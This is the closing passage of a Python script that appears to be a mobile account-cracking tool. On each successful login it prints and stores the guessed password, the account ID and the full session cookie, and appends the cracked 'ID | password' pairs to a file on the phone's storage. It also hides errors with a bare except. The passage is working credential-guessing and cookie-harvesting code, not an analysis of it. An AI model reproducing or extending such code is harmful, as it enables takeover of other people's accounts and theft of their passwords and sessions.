                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\r\33[1;92m [RXS-OK] '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\33[1;92m [✨] Numer : {uid}')
                print(f'\r\033[1;92m [🍪] COOKIE : '+coki)
                cek_apk(session,coki)
                oks.append(cid)
                open('/sdcard/RXS-OK.txt', 'a').write(cid+' | '+ps+'\n')
                break
            else:
                continue
        loop+=1        
    except:
        pass
RXS()
